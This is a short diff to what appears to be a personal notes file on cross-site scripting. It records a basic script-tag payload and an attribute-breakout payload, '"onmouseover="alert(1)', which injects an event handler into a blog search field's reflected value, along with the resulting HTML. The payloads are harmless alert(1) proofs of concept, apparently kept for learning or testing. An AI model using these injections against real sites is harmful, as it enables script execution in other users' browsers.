@@ -4,3 +4,16 @@
 // classic....
 <script>alert(1)</script>
 
+===
+
+// test user input.
+// determine input is reflected inside a quoted attribute...
+// <input type="text" placeholder="Search the blog..." name="search" value="test123">
+// let the hacking begin... lol
+"onmouseover="alert(1)
+
+// results in:
+// <input type="text" placeholder="Search the blog..." name="search" value=""onmouseover="alert(1)">
+// and for some reason, no space is required between attributes after quote...
+
+
